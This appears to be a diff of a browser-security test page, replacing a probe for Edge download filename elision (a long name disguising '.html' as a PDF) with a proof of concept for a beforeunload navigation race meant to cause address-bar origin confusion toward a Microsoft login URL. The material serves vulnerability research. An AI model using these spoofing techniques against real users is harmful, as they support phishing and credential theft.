@@ -1,27 +1,28 @@
 
 <!doctype html>
 <meta charset="utf-8">
-<title>Edge download filename elision probe</title>
+<title>Edge beforeunload navigation race PoC</title>
 <style>
   body { margin: 32px; font: 16px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
-  button, a { font: inherit; padding: 10px 16px; }
-  code { background: #f3f4f6; padding: 2px 5px; border-radius: 4px; }
+  button { font: inherit; padding: 10px 16px; }
+  pre { background: #111827; color: #d1fae5; padding: 14px; min-height: 90px; white-space: pre-wrap; }
 </style>
-<h1>Edge download filename elision probe</h1>
+<h1>Edge beforeunload / modal navigation race PoC</h1>
 <p>
-  Tests whether Edge download UI clearly shows the dangerous final extension for a long/confusable filename.
-  The file content is harmless text.
+  This probes a recurring class where browser modal state, provisional navigation, and stale content
+  used to create origin/address-bar confusion. Safe behavior: Edge should not show a trusted target
+  origin while this page remains actionable.
 </p>
-<a id="download" download>Download harmless test file</a>
-<p id="name"></p>
+<button id="arm">Arm beforeunload and navigate</button>
+<pre id="log"></pre>
 <script>
-const longName = "Quarterly_security_report.pdf" + "_".repeat(120) + ".html";
-const blob = new Blob([
-  "Research-only Edge filename elision probe. This is not executable.\n",
-  "Expected safe behavior: the download UI clearly exposes the final .html extension.\n"
-], { type: "text/html" });
-const a = document.getElementById("download");
-a.href = URL.createObjectURL(blob);
-a.download = longName;
-document.getElementById("name").textContent = "Download attribute filename: " + longName;
+const log = s => document.getElementById("log").textContent += s + "\n";
+document.getElementById("arm").addEventListener("click", () => {
+  log("arming beforeunload");
+  window.onbeforeunload = () => "research navigation-race prompt";
+  setTimeout(() => {
+    log("navigating to closed-port localhost target");
+    location.href = "https://login.microsoftonline.com:81/common/oauth2/v2.0/authorize";
+  }, 80);
+});
 </script>
